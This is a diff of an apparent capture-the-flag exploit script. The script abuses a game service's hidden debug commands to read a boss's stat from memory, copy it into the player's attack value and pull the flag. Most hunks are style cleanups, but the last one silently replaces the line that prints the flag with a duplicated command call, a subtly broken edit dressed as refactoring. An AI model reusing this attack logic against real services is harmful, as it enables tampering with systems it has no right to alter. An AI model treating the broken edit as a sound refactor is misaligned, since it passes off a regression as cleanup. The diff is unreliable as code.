@@ -16,7 +16,7 @@ def lg(s,addr):
     print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
 
 def raddr(a,l=None):
-    if l==None:
+    if l is None:
         return u64(rv(a).ljust(8,'\x00'))
     else:
         return u64(rl().strip('\n').ljust(8,'\x00'))
@@ -37,23 +37,23 @@ def save():
 #    print(boss)
 
 def setaddress(addr):
-    cmd('DebugSetDataStoreAddress#'+str(addr))
+    cmd(f'DebugSetDataStoreAddress#{str(addr)}')
 
 def show():
     cmd('ShowInfo')
 
 def hack():
-    cmd('VeroFessIsHandsome') 
+    cmd('VeroFessIsHandsome')
     save()
     setaddress(boss)
     show()
     k=rl().strip('\n')[2:]
     setaddress(my)
     show()
-    cmd("SetATK#"+k)
+    cmd(f"SetATK#{k}")
     show()
     flag=rl().split('|')[-1]
-    print flag
+    cmd('VeroFessIsHandsome')
     p.interactive()
 
 hack()
